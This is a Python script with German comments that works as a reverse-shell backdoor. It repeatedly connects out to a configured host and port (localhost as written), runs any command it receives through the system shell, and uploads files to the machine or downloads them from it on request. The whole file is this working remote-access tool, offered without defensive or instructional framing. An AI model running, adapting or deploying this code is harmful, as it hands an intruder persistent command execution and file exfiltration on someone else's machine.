import socket
import os
import subprocess
import time

CLIENT_HOST = "localhost"  # IP des Clients
CLIENT_PORT = 12345       # Port des Clients
RECONNECT_INTERVAL = 5    # Sekunden zwischen Verbindungsversuchen

def handle_client(client_socket):
    """
    Handhabt die Kommunikation mit dem Client:
    - Shell-Befehle ausführen.
    - Dateien hochladen und herunterladen.
    """
    while True:
        try:
            command = client_socket.recv(1024).decode()
            if not command:
                break

            if command.startswith("UPLOAD"):
                # Beispiel: "UPLOAD test.txt"
                _, filename = command.split()
                with open(filename, "wb") as f:
                    while True:
                        data = client_socket.recv(1024)
                        if not data:
                            break
                        f.write(data)
                client_socket.send(f"Datei {filename} erfolgreich hochgeladen.".encode())

            elif command.startswith("DOWNLOAD"):
                # Beispiel: "DOWNLOAD test.txt"
                _, filename = command.split()
                if os.path.exists(filename):
                    with open(filename, "rb") as f:
                        while chunk := f.read(1024):
                            client_socket.send(chunk)
                    client_socket.send(b"<EOF>")
                else:
                    client_socket.send(b"Fehler: Datei nicht gefunden.")

            else:
                # Shell-Befehl ausführen
                try:
                    output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
                except subprocess.CalledProcessError as e:
                    output = f"Fehler bei Befehl: {e.output}"
                client_socket.send(output.encode())

        except (ConnectionResetError, BrokenPipeError):
            print("Verbindung zum Client unterbrochen. Warte auf neuen Versuch...")
            break

def connect_to_client():
    """
    Baut die Verbindung zum Client auf und hält sie aktiv.
    """
    while True:
        try:
            print("Versuche, den Client zu erreichen...")
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((CLIENT_HOST, CLIENT_PORT))
            print(f"Verbunden mit {CLIENT_HOST}:{CLIENT_PORT}")
            handle_client(client_socket)
        except (ConnectionRefusedError, socket.error):
            print("Client nicht erreichbar. Erneuter Versuch in wenigen Sekunden...")
            time.sleep(RECONNECT_INTERVAL)

if __name__ == "__main__":
    connect_to_client()
